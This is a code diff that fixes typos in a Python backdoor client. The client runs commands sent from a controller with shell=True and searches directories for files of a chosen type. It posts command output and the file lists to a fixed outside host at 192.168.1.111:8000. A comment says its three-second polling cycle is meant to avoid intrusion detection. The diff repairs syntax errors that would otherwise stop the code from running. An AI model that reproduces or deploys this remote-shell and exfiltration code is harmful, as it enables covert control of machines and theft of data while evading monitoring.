@@ -40,18 +40,18 @@ while True:
 
     elif 'search' in command:
         command = command[7:] # getting the directory route
-        path,ext = commmand.split(" -filetype ") # split interval
+        path,ext = command.split(" -filetype ") # split interval
         list = ''
         for dirpath, dirname, files in os.walk(path): # looping OS for path, name and files
             for file in files: # check file lists
                 if file.endswith(ext): # here we evaluates file extensions
                     list = list + '\n' + os.path.join(dirpath, file) # adding items to a multi-line string
-        requests.post(url=''http://192.168.1.111:8000/', data=list) # posting the result
+        requests.post(url='http://192.168.1.111:8000/', data=list) # posting the result
 
     else:
         CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stdout.read())
         post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stderr.read())
 
-    # 3 seg cycle - avoiding IDS
+    # 3 sec cycle - avoiding IDS
     time.sleep(3)
